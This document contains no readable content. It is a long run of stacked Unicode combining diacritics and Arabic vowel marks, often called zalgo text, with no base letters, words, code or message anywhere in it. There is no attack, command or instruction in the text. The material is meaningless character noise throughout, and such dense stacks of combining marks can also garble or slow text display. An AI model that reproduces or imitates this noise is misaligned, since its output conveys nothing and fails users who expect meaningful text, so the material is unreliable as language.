̴̷̶̶̴ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̡̢̡̢̛̛͙͎͈̻̜̹̺͙͔͍̣̟̻̖͓̖͔̲̳̞̠̱̈́ͩ͂̌̐̃̓ͬ̀̉ͩ͒̾ͣ͂́ͯ͋ͭ͟͞͝͠͞ͅ҉̷̷ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̡̨̛̱͕͍̹̣̙̲͉̭͉̲͖̜̻́̊̀ͭ̆̐̏̿̅͒́͘̚͜͟͞͞͞͏̸̸̶̵̴̷̴̵ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̧̨̢̛̛̛̛̛̛̛̞̩̖͈̘̪̗̥͉͇̘͓̲͇̩̟͎͕̪͉̙͓̦̠͇͎ͣ̈ͪ̎ͭͧͨ̓́̇ͨ̍͛ͨ̉ͧͨ̐̀̽͆́ͪ̉͘̚͘͟͜͡ͅͅ͏ِ҉ًٍَُّ͓̻̟̞̈ͧ͏̵ًٌٍَِّ̡̢̗͉̠̀͂ͩ̔̍̄҉̷̶̸ًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̨̛͔͎͍͉͔͈̙̫͚̗͓̙̓̽͋́̆̂̊́͂͆̓̍̚͘̕͟͞͞҉̸ًٌٍٍَُِّّ̢̼̯̼̜̪̉͒ͥͤ̚͘͠͠҉̷̵̷̸̴̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̛̥̹̹̫̫͔͍͉̖͈͕ͥ͑̿̑̓͋͗̿̆̑ͩ͆̈́̀̑ͨ̕̚͟͜͞͞҉̸̴ًٌٍََُِّ͚̜̹͌̃ͯ̕͜͝͏̷̷̸̷̶̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̡̨̼̞̩͚͖̼̞̠̥̪̜͉͉̓ͬͯͬ͐ͪ̒ͩ͌͂͊̊̍ͧ͜͟͡͝͞҉̴̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̨̞͉̣̯̫̺̏̆͌͛̀ͫ͌̚͘͝͞͞҉̶̶̵̸ًًٌٌٍٍَََُُِِّّ̗̬̺̟̮͈̭̰̏̄̽ͫͫͨ̅̿̕͘͝ͅͅ͏ًٌٍَُِّ̧̠ͨ̿҉ًٌُ͕̤͂ͤ͝͏̷̵ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̡̛̛̤̟̤̖̣̞̖͕̩̝̗̦̣̉̀̉́̈ͣͤ̇͐ͤ̽ͧ̋̿̌̈ͮ͘̕̕͢͝͞͏̴̸̶ًٌٌٍَُُِّ̢̗̣̞̪͓̽́͗͌̏̿̆̇͢͡͏ٍِ̣̆͘͏ًًًٌٌٌٍٍَََُُُِِِّّّ̧̢͙̗̠͓̺ͦ͐̏̎̇̎́̓ͦͨ̀̉ͦͥ́ͪ̋ͧ͘̕̚͞҉̶ًٌٍَُّ͌̔̀ͯ͏ٍَِّ̠͛́͟҉ًٌٍُِّ̧̥̻̥̺̐ͣ͗͜͟҉̴̶̶ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̢̛̻͚̼͓͙̲͇̮̥̜̺̱̼̮̼͂͑ͣ̒̌̍ͣ̌̏ͫ͗ͨ̀̍̒̉̀́͘͟͡͞͡ͅͅͅ͏̶ًًٌٍٍََُُِِّّ̡̧͇̣̫̬̪̱̥̈̾͛̿ͣ̂ͭ͘͟͢͞҉ٌِ͉ͭ͏̷̷ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̡̧̧̫̖̭̰̺͚̼̳̱̳̬͍̦͍̲̝̉ͤ̀ͤ͑̀́̓͌͐͌ͥ̋͗ͮ̋̌ͨ̚̕͘͢͠͠ͅ͏̴ًُ̱̙̆͏̶̴ًًٌٌٌٍٍٍَََُُِِِّّّ̢̡̺̮͇̹̮̩̩̹̩͖̻͈̍̈̒ͩ͌̎̏ͣ͡͡҉̵̴̵ًًًٌٌٍٍََُُُِِّّ̡̱͚̩̩̙̩̰̘̺̱̲ͧ̀̀ͪ͐ͭͦ͘͟͡͡ͅ҉ًٌٌٍٍَُِِّ̡͖̯͓͔̼̻̉̄́̓ͬ̉͛ͤͥ̈́͝͡ͅ͏ًًٌٌٍََُُِِّّ̨̨̡͈̥͇̖̮̱̝̞̈̐̎̄́̊͡͝͏̷̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̨̡̛̛̛̮͓͚̟̠͓̟̝̭̻̱̙͚̣̰͕̻̙̬̥̞͉̈͊̾ͫ͒̃ͬ̓ͩ̀̿̌̂́̐̑͗̑́̇̄̓ͨ̀͑͆͟͟͟͢͞͝͡͠͝҉̵ًٌٍٍََُِّّ̢̢̰̻̱̯̹ͭ̅ͩͨ̃̕҉̷̷̸ًًٌٌٍٍَُُِِّّ̢̡̨̣̗̖̞̞̥͂̌̽̏̾̕҉̵̵̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨͙̰̪̱̱̟̩̤̟͓͎̗̪̙̿ͣ̓́́͆́͒̇ͨ̏͐͆͘͜͢͢͢͞͏ًَُ̤͐̐ͩ͏̷ًٌٌٍَُِِّ̦̲͍ͨ͋ͪ̌ͧ̀͜͜͢҉̸ًًٌٌٍٍٍَََُُِِّّّ̧̢͔͔̞̠͍̙̹̖̬͈̠͍́̀̒̄ͧ͆̃͋ͤ̊͑̍͢͝͡͏ًٌٍُِ̭͙̙̳̗̋́҉ّ͏ًًًٌٌٌٍٍٍَََُُُِِِّّ̢̧̢̻͔̪̠̪̆́̉̑̈̀̔ͪ̓͋̄ͭ̂́ͮ̕͟͢҉ًٌَُِّ̫̘ͫ͋̇ͬ͘҉̵ًٍَّ̛̠͍ͯ́ͫ͏̶̷ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̢̡̧̡̳̬͖̬̺͔̲̺̝̼̥͎̳̙̘̲͕̰̞̬̯̱̮̋̾̉̍͛ͭ͑̎ͬ͑͊͒͑ͥ͗́ͬͧ̀ͣ̀̍ͧ̕͘͢͜͜͞͝͡ͅͅ͏ًٍَّ̺̤̭͒͂҉ُ̝҉ٌٍِ͇͛̑҉̶ًًٌٍََُُِّّ̪̫̦̠̗͙͇̿̉͊ͥ́ͨ̏͛͟͢͟͝͡͏̵̷̶̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̢̡̧̧̡̫̺̼̥̪̮͈̼̖̳̭̝̻̗̫̣̖͕͖͖̤̣̦̹ͨͦͫ͂͆̎̎͊̓̿͗ͯ͆ͬ̆́̕͜͢͠͞͝͡͞ͅ͏̶̸ًًٌٍََُِّّ̛̛̪͔̙͖̄ͯ̑ͪ́̎͞͏ٌٍُِ͖̾́͂҉̵̵ًًٌٌٍٍََُُِِّّّ̛̲̼̱̙̩̤͗̒̽ͯ͜ͅ͏ًًٌٌٍٍَََُُِِّّ̧̨̱̭̺̮̙̒̄̑̑ͧ͐̊̋́ͧ̕͟͝͝҉̷ًًًٌٌٍٍََُُُِِّّ̡̘̯̩̖̜̞̘̭̬ͨͨ͂̊̋ͧ̉͒̍ͧ̕̚͞͡͞҉ٌٍِّ̱̈̀̐͜͏̴̷̴̶̸̷̶̴̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̡̨̢̛̛̛͔̺̼̥̯̳̳̰̘̺̯̱̬̜͉̫͈̹̐͑͊ͤ́ͯ̒ͨͬͥ̐̀̽͊ͭ̐ͦ̄̓ͨ͘͟͟͠͠͝͝͞͞͝ͅ҉̷ٌُِ͍͊̿҉̶ًٌٍٍَُِّ̢̝͔̲͎̥̌́̓̔͝ͅ͏̷̸̸̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̧̨̡̮͈͉̺̠̼͖̗̦̩̜̙̠̞̯͂̄͌̊͂̃́ͬ̾̒ͯ͟͟͢͡͝͝͠͏̴̴ًًٌٌٌٍٍََُُُِِِّّ̪̺̹̣̤͙͆̀͌̑ͮ̍́̐͘͢͜͡͝͏̷̸̶̴̶̵̵̷̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̡̧̡͉̖̥͇̥̭̼̙̣̬̱̤̘͕͇̘̟̪̺̖̲̼̪͇̈ͧ́ͤ̏̔̏͌͒̾̎̈͌̑̀̊͋ͫ̀̀̄̍̎̀̍̎̉͘͢͢͜͝͡͝͠͞ͅ͏̷̷̴̶̸̴̸̷̴̶̸̶̶̵ًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّ̢̧̨̧̨̡̨̡̢̨̧̡̧̨̛̛̛̛̛̛͍̥̼̫͈̣͔͍̯̱̮͖̟̪͚̦͕͓̹͔̹͕̱̝͉͕͙̭͇̟̲̭͚̩̩̣̪̞͔͖̼͚͖̭̯͓̻͕̘͔͙̪̺͍̣̝̯͕̬̪͓͉̗̈̂̌͆ͬ̿ͭ͐͒ͫͤ̀̾ͨ̈ͬ͋̇ͨ͊͐̓̾͌̆ͫ̎̉ͮͫ̑̈́́ͯͧͥ̀̀ͯ́ͨ̅́̉̽ͦ̎̊͋̿ͭͫ̐̀͋ͯ̒̈́̋̂̂͒̓̀ͨ͊͐̀̈̅̾͐͛͋́ͮ́͘͘͘̕̕͟͜͜͜͟͟͟͟͟͢͝͞͠͝͡͡͡͠͞͠͠͠͝ͅͅͅ҉ًًٌٌٌٍٍٍََُُُِِِّّّ̢̨̰̱̱͔̪̞͓͚̟̖͒̊̄ͯ̀̓͛̊̚̚͢͢͟͢͝͡҉̶̵̵̷̴̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̢̧̼͖̹͉͕̫̤̙̝̤̼̩͈͎̤̋͊̀͋͒̎ͭ̄ͧͫ͑͒̂ͯͭ͂̑̅͘͟͜͝͝҉̶̸̸ًًًٌٌٌٍٍٍَََُُِِِّّّ̧̡͔̣͍͓͎̹̯̳̍ͯͤ̂͆̅͐͡͠͡͏ُ̾҉̴̴ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّ̨̛̩̤̺̬͓͉̻̘̖͓̞̩̦͓̐̎ͣͫ̓͑͠͡ͅ͏َّ͖̘ͪ͏̴̵̵̴̵̸̵̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̡̧̡̧̞̼̮̯̤̰͙̗̣͚̝͈̹̗̖̪̠͚̮͎̟̹͇͇̺̯̖͓̖̫̝͔̺̥͋̾̐̊ͩ̂̂̌̋ͦ̑ͬ̏̈̀͐ͤ̀̅ͤ̓̔̋ͦͣ͆̌̈́̀ͪ͋͊͆̽̈́̎ͪ͘͢͟͝͞͞͠͞͡͠͝͝͞͠͠͝͞͝ͅ҉̸ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̧͇̰͇͈̤̱̱̪̺͇̬̲̬̻̎̊̊̎͗ͦ̽ͭ̿ͨͯͯ̊͘̚͢͜͢͠͏̵̷̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̧̧̨̡̛̩̦̠͖̗̪̞̞͉̲͓̩̱̥̲̘͔̭̫̭̰̮͕̖̫̦͑͗ͤ̎ͭ̎̽̓͛̀ͮ͆̏̉ͣͭ̅́͛ͫ̚͜͞͡͞͠͞͞ͅ͏ً̈́҉̶ًٌٌٍٍََُُِِّّ͉͓͕̪̮̣͋̋̈́ͥ͛̎͑ͯ͢͠͞͏ًًٌٍَُِّ̛̯̳̗̏̂ͬ̄́̆͟͡҉̷̸̷ًًٌٌٍٍََُُُِِّّ̧̺͇̝̠͈̰̒͋̉͂́ͭ̀̀̕̚͝͞͏̶̸̷̵̴ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِِّّّّّّّ̨̨̧̛̛̮̗̱̳̖̙̜̟̰̟̯̲̥͕͍͎͖͖̫͉̪̹̹̳̪̦̩͚̐ͮ͋̌̅ͦ̃̏͑͋̓͗̊͑͗́̍͛̽ͤ̋̏́͐̑̓͌̽ͨͨͭ͘̕̕͢͟͢͡͡͝͡͞ͅ͏̷̴ًًًٌٌٌٍٍَََُُُِِِّّ̡̩̪̮̦͉͓̳͉̲̲̀̈́̍̓̒̽ͮͥ͂ͮ̃͢ͅ҉̸̶̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّّ̢̛̣̱̝̳̘̹̳͖̯̪̳̹́̿̅̒̐͐́͆̄ͩͫͪ͋̿ͣ̕͘͟͟͝͠ͅ͏̸ًٌَُِ̹̠͕͉̔̄́̚͜͏̷ًٍَُّ̺͍̮̃̂ͭ̂͏̵̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̛̛͖͕͓͓̟̼̞͇̫͈̜̦ͫͦͤ͒ͪ͂͐ͫ̍ͦ̔ͪ̓͂̆͘̕͞͠͏ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̨̧̧̻͓̪̖̳͙̟̤͙͇̖͐ͤ̌̎̇͌ͣ͊̈͋̂̄͘͢͜͝͝ͅ͏̷̵ًًًٌٌٍٍٍَََُُُِِِّّّ̢̨̧̡̭̳̹̬̻̮ͯ̐ͫ͂̏́͟͏̴ٌٍَِّ͈͕̏̿ͪ͞҉̵ًٌٍُِ̗͕̈́̚͏̶ًًًًٌٌٌٍٍٍََََُُُُِِِّّّّ̧̨̡̢̡̛͚͎̜̙͈̩̭̰̺͎̦̰̬̤̍̀̈̔̀ͩ͛̾̾̄͛ͤ̍́ͦ̒͛͜͢͟҉̴ًٌٍَِّ͇̹̫̺̐͠͞҉ًٌٍَُُِّ̲̙ͥͯ́͛̚͜͟ͅ҉̷ًًٌٌٌٍٍٍَََُُِِِّّّ̱̱̳͍̝͖̬͚̜̭̈ͣ̔̋̆ͦ̀̄̾̕̚͜͜͡͏ًُ̣̮ͪ҉̵ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̨̮̯̰̝͎̟̰̦̣̰̖̺̈͆̐̀̓̾̊̏ͯ͊̎́͋͘͢͡͡҉ًٌٌٍَُِِّ̢̡̜͂̽̕͘͡҉̵̶̸̷̵̵̶̸̴ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̡̨̨̧̨̛̜̯̘̠̬͍̰̤̥͚̞̣͚̠̬̹͈̬͉̹̙̙͈͔͉̤̘̫̫̙̳ͬ̔ͫ̑͆ͩ̍̏͒̍͌́̆̒̔̊̑̔ͭ̀̋ͭ̅̏ͦ̑̽ͯͭ͗ͦ̀͒͋͆̕̚̕͜͟͢͡͝͡͞ͅ҉̷̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̥͙͙͚͚̮̺̘̙̦̼͎́̅͒͋̑̀̓̔̏̊͘̕̚͜͢͡҉̶̷̶̵̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̧̨͖̩̪̮̙͉͎͍̬͙̤̣̫̦̪ͮ͗̈́́ͧ͒́͆ͬ̍ͬ̀̓̐ͬ́ͣ͒̓ͮͦ̈́͒͒͘͘͜͜͜͜͢͡͡҉̷̶̸̴̵̵̶̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِِّّّّّّّّ̢̡̛̣̠͍̗̬̹̤̭̱̩̫̮̫͚̰͓͍̩̺̗̥̞̻̳̼̹̀̋̉̿͋̋͂͊̉ͧ̈́̌̇̎̉̀ͮ͊ͩͩ̈͆̾̽̿̉͊̽̑ͬ̕̕̕̚͜͟͟͜͟͠͞͡ͅ҉ًٍَّͨͅ͏̴̶ٌٍُِّ̢̠̪͚ͧͪ͟҉̵̵ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̢͈̣̖͍̗͙̹̳̣͈̭̖͖̒͗͒ͤ̈̔̉ͩ̿̔ͯ̓̚͘̚͢͜͟͢͠͞҉̵ًٌٍٍَُِِّّ̢̢͉͇̖͚̱̮̯͑̌ͤ̄ͨ́͏ًٌٍَُِّ͉̩͍̺̐̂̊ͤ͢͡҉̵̷̶̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̡̢̛͔͖̟̣͍̗̜̺̬̺̙͈̫̳͔̻͖̣̰̊̀͑̀̑̓̀̏̂̔̽ͩ̀ͭ͗ͭ̃̽͘͘̕͢͜͠͠͝͡ͅͅͅ͏̶̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̢̢̛̫͚͎͍̱͕͎͈̅̏̀̏͋̄̋͂͘͢͝҉̶̸̷̵̵ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̡̝̞̲̜̫͇̼͇̱̜̳̰͕̊̊͗̐ͬ̀̋ͪ̏̓͛͆͑ͮ̓͂̌̚͘̕͢͢͢͡͡҉ًٌٍَُِِّ̢̛̗̯͖̣͌̔ͬ̆͟͡͞҉ًٌٍٍَُِّ͎̲͉̝̦̯͐͂̇͒̓͘͜͡͝͏̶̸̴̴̷̶̸ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّّ̢̨̛͔̫̙͉̙̩̬̝̣̙̙͔̥̬̦ͤ̍͒̃̅̔̌ͮ̏ͬͯͪ͗̓͊͂͘̕̕̕͢͜͟͞͡͠͝ͅ҉̶̶̷̸ًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̡̧̨̜͔̫̖̜̰͙̥̝̟̯̰̯͖͕̰̝̙ͬ͒ͥ͋̏̍͆͐̌̚̕̚͘̕̕͢͜͞҉̸̵ًًًٌٌٍٍََُُِِّّ̧̛͎̣͙͙͚͙͖̓̃͋͑̆̕͜͞͠҉̴̵ًًٌٌٌٍٍٍََُُُِِِّّّ̡̧̹̤̖̪̪̯̳̺͈̮̰ͨͭͩ̍͌͗͂͛̀̀͝ͅ͏ًَ͓ͣ͊͏̸̴̵̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̨̢̪̹͓͍̱̟̹͙̦̳̖̪̆ͣ̎̓̽͌ͪ͒̌ͪ́̿̀̀̉̍̀̐̆͐̕͘͜͟͢͞͠͞ͅ͏ًٌٌٍٍَُِِّّ̧̨̱̥̻̺̲̲̈́͑͌͐̉͜҉ًٌَُ̛͉̪ͫ͠҉̸̶̵̵̸ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̧̨̢̡̻̜̯̮̞̫͍̥̣͖̱̲͙ͦ̇͗́̑ͨ͆ͭͨ͐ͬ͌ͯͫͦ̚̕͞͡ͅ͏ٌٍُِّ̛̯͍̞̭ͩ͊҉̵ًًًٌٌٍٍَََُُِِّّ̨̛̹̟̞̺͙̟ͬ̈̀ͣ̎͊̈͟͜͟͝͞͏̷ًٌٌٍٍَُُِِّّ̨͕̗̣͈͌ͣ̓̀͑̿͌̕͠҉̷̷̴̸̸̸̸̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّ̡̢̢̧̛̱͚̹͖̩͚̳̪̮̯͚̣̪̳̠̭̮͉̤̬̤̞͈̯͇̖͆ͥ̎͋̂̎̇͋̋̽ͥ̅̒͂̎̈́ͪ̏̆ͤ̾́͆̄ͪ́̚͘̕͜͟͠͞͏̸̶ًًٌٍَُِّ̣̼͚͚̖̲̜ͧ̾͘͟͡͝҉̵̴̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̧̢̢̧̨͔͎̹͎̮̬̹͚̞̣̼̘̪̘̬̻̯̼̅̆ͤ̒͋̄̍̌̊̂ͣ̒̌͊̔̇͌ͧͤ̑̕͢͟͟͡͡͠͞͝͏ٌُِ̢̜͋͘͏ٍّ̤̦͟҉ًًٌٌٍٍََُُِِّ̡̧̭̖͓͍̖̥̣̭ͮ̀̀̅͘̕͏̷̴̷ًًًٌٌٍٍَََُُِِّّّ̧͚͓͓͙̼̝̹̳͈̓̽ͥ̔ͥ͌͒ͩ̾͘̕͜҉ُ̰҉̶̴̴̸ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̡̢̨̡̨̛̛̪̩̖̳̥̦̮̝͓̞̮̖͍̟̲͙͇̞̠͖͈̫̳̋̋̀͗ͥ̂́̅̆̋́̆ͭ̿̐ͦ̔͂͋̄̄́ͪ̀̃͐ͫ̿̀̓͘̚͟͞͞͡͠͞͠͡ͅͅ҉̷ًٌٍٍَُِِّ̢̡̥͉̠͚̪̃͂̇̃͊̋̑͏̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧̢̨̡̨̛̜̬͔̯̹̬̟̼̱͂͊ͪ̀ͮ̏͘͘͝͝͞͏̴̸ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̨̧̛̜̳̖͖̬̫̼̣͉͎͉̭̤̹̝̏͌̔͒́̐́̍̈ͫͮͨͧͩͩͯ̐̕͜͜͟͡͠͝͞͡҉̴ًًٌٍٍََُِِّّ̛̛̱̝͎͉̬̬͉͎̮̎ͥ̀̋̋ͣ̒̌̕͘͟҉̷̶ًٌٌٍَُُِّ̡̣̜̤̳̓̎͗̌̀̚̕͞҉̶̵ًًًٌٌٍٍٍَََُُِِِّّّ̡̧̟͓͍̳̭̭̬̬̲̟͓̽͋́ͬ͆̍ͪ͆͋̄́͑̅ͫ͘҉̸̷ًٌٌٍٍَُُِِّّ͔̲̦͇̜̇ͦ̅͋̀̍ͬͣ͜͟͢͞͏̷̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̧̫̰̹͔̯̻̪͔̞̻̣̳̆̍̄̏ͯ̾̉̍́̊̆̃̕͜͢͡ͅ҉̴̶̴̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّ̢̡̢̡͍̖̞̠̬͔͔̠̠̩̝̤͇̙̳ͭͫͥ̀̈́̿͛͑̒́ͫͫ̈́ͮ̓̅̇̔̕͘͢͞͝͠͝͞͝͡͝͡͡ͅ҉̷̶ًٌَُِّ͓̣̪̑ͧ͂͛͏̷̵̸ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̧̛̛̳͉̹̟̱̼͔̟̹̟̫̫͈͙̭ͬ̑̍͛̈́́̋̈ͫ̔̌̓̀̊̃̎̑͗ͦ͘͜͞͡͏ًًٌٌٍَُُِّ̢̛̛̟̫̲̫͖̺̅̐ͅ͏ٍَِّ̧̫̀̀̽͏̷̷̵̴̴̷̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̧̡̧̧̡̛̺̯̼̝̻̱̰̞̜͈̥̩̣̱͍̟͉̪̫̥̝̼͚̼͉̺̖̬̼̟̞͔͔̰͒̀̔͌ͩ͒̐̄ͨ̔̀̀͗ͨ̓ͫ̓͑ͪ̀́͛͐ͦ̎̔ͭ̌͌̉̀͐́̈ͭ̕̚̕̕̚͘͢͟͢͢͞͠͡͠͞͡͡͠͡ͅ͏̵̵̵̸̵̷̸̵̸̸̷̶̴̸̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̧̢̧̢̡̨̡̡̧̛̪̦͙̦͓̟̺̹̝͔̘̹͕͉̯̺̞͇̜̞̖͈̮̩̥̙͍̠̟̬̫̫̟͇̥ͯ̄͋͛ͭͫ͌͒ͨͤ̓̂̋̇̿̌ͭͧ̐́̑̎͌ͨ͌̽ͨ̽̒͛̒̀͂̆͘͘̚͘͘̕͢͠͠͞͡͠͠҉̶̶̸̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̨̡̧̢̛̼̭͚̞̩͇̩̤͇̗̣̮͕̟̭̙̦̤͂̀ͦ̽͂́͆̆͐ͩ̃́̂̾͒̃͊͘̕͟͢͠͝͞͠҉̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̧̨̛͇͉̠͉͈̙̼̙͂̾̌̆̈͘͠͞͞͝҉ٍِ͈ͧ҉̸̸̷̴̷ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̛̳̲͍͓̮̝̣̺͇͍͍͓̗͂͌͑ͪͮ̓̔̇̆̏̚̕̕͢͡͞͠͏ًًٌٍٍََُُِِّّ̢͚̤͔̳̙̲̹ͤ̆ͣ́̉̾͢͢҉̴ًٌٍَِّ̱͇̭̓͝͏̴̸̶̶̶̵̶̵ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̧̨̛̛͓͈̺̞̳̺͎̤̤̞̪͈͙̪̖̙̹͕͚̫̙̮̩̮̯̻̮̼̙̞̺͙̐̍͆ͥ͆͆̂͐͆̅ͤͫ̿͐̂ͬ͐̍͌̓͊̾̒̇̀ͫ̀ͣ̏͘͘͘̕̚͟͟͠͡͠͝͞͞ͅͅ͏̷̷ًًًٌٌٌٍٍٍََُُُِِِّّ̧̧̢͈͚͚̪̬̞̬͕͖̋̽ͮͯ̓͛̌ͤ̄ͥ́ͧͥ͟͠͠͏̴̸ًٌٍََُِّّ̨͔̹̘͒̀͂̽͜ͅ҉ًٌُ̤ͧ҉̵̷̵̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̛̳̦̥̙̼̳͚̪̩̯̮̐̔́͊̅ͤͪ̊̄͆̚͘͠͠͠͝͝͏̶̸̶̸̸̵ًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̡̧̤͉̹͎̠̳͔̰̘̘̞̤̪̝ͭ̓ͦ̉ͩ̾̇̑͆ͧͪ́̍ͥ̏̎ͮ͂̕͢͢͡͠͞͏ًًٌٍَُُِّ̨̡̧̣͓̝̣̙̑̄̎̍ͣ̆̐ͧ͠͏ًٌٌٍٍَُِِّ͇̟̖ͮ͒̍͋͟͜͢͞͏̸̵̷̴ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̡̨̧̡͇̖̦̬̤̳̭̣͓͖̱͇̅̆̈́ͥͨ̈ͧ̃̈́ͬ͌̊̉̔́͆ͮͬ̐̔̅̕̕͟͢͜͡͠͝͞͝͝͞͞͏̶ٌٍَُِّ̨̰͈͓̖̭̾ͬͥ̓͝҉ًُ̹̹̀͞͏ٌٍِ̧̹̫ͯ͝҉̶̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̡̢̡̛̤̻̳͍̯͓̮̣̬̒̋͆͗̌̌ͧ̊̂͗̑̈́̏ͦ̕̚͟͜͡͞͏̴ًَ͏ٌُ̯ͩ͜͏̴̶̶̴ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̧̡̡̛̗̜͚͈̖͍̟͚̝͖͕̣̳̲͙͖͋ͪͥͦ̄ͬ͆ͦͪͯ̂̋̓̀͘͜͟͠҉̶̶̶̸̴̶̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̢̧̮̞͍͓̳͔̜̥̜̪̩̯̼̣̭̻̼̤͚̹̙͔̗͚̱͉̦̤̻̒͊̀͆̄́́ͨͭͧ̉ͧ̋̓́ͥ̔ͮͣ̿̌̐͋ͩ̌́ͯ̑ͯ͘̕͘͜͟͝͞͡͝͠͞͝ͅ͏ًٌٌٍَُِِّ̥̳̥͎ͨͮ́ͮ̌͐̅͑̕ͅ҉̸ًٍَّ͎̬̿̓ͭ̕̚͝͏̵̶̷ًًٌٌٍٍََُُُِِّّ̦̝̼̝̪͙̟̦̭͉̌ͩ͗̌̈́̍̃͂̌̎̕̕̕͜͜ͅ͏̶̴̸̴̴̸̵̶̶̷̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̧̡̡̡̛̮̳͍̮͓̟̟̺̰̲̮͕̯͓̰̬͔̜͚̲͙̜ͮ̅ͯ͆̒̍ͨͦ͗̐̂̏ͥ̉ͯ͛̆̉͋̈́ͧ̌͂̓ͮ̎̄̒̽ͧͦ́ͮͧͭ͘̚͘͘̚̕͢͞͞͞͡͠͝͞҉̴̷̷̴̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̧̛̛̖̠̰̬̞̯͖̦͈͙̰̰͚̠̬̫̮̠ͯ̂ͮ͋̒̔͒̔́̐̑̋̈̃̾̀̂́̓́̓͘̕͢͢͡͡͠͠͝